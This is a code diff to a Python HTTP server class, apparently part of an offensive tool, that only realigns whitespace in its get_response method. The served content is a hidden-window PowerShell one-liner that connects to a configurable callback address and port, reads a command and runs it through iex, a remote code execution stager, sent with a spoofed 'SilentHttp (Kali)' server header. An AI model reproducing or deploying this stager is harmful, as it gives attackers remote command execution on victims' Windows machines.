@@ -72,20 +72,20 @@ class HTTPServer:
                 return data == correct_request
 
         def get_response(self):
-                content                         = """powershell -wi h -c 'start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new(\"""" + self.callback_address + "\"," + str(self.callback_port) + ");[io.streamreader]::new($t.getstream()).readline()|iex}'"""
-                http_response                   = "HTTP/1.0 200 OK"
-                http_server                     = "Server: SilentHttp/1.0.0 (Kali)"
-                date_now                        = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
-                http_date                       = "Date: " + date_now
-                http_content_type               = "Content-Type: application/octet-stream"
+                content                 = """powershell -wi h -c 'start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new(\"""" + self.callback_address + "\"," + str(self.callback_port) + ");[io.streamreader]::new($t.getstream()).readline()|iex}'"""
+                http_response           = "HTTP/1.0 200 OK"
+                http_server             = "Server: SilentHttp/1.0.0 (Kali)"
+                date_now                = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
+                http_date               = "Date: " + date_now
+                http_content_type       = "Content-Type: application/octet-stream"
 
-                actual_content_length           = str(len(content))
+                actual_content_length   = str(len(content))
 
-                content_length                  = "Content-Length: " + actual_content_length
-                last_modified                   = "Last-Modified: " + date_now
-                last_line                       = "\r\n"
+                content_length          = "Content-Length: " + actual_content_length
+                last_modified           = "Last-Modified: " + date_now
+                last_line               = "\r\n"
 
-                http_header                     = [
+                http_header             = [
                         http_response,
                         http_server,
                         http_date,
@@ -95,8 +95,8 @@ class HTTPServer:
                         last_line
                 ]
 
-                http_header                     = "\r\n".join(http_header)
-                full_response                   = http_header + content
+                http_header             = "\r\n".join(http_header)
+                full_response           = http_header + content
 
                 return full_response
 
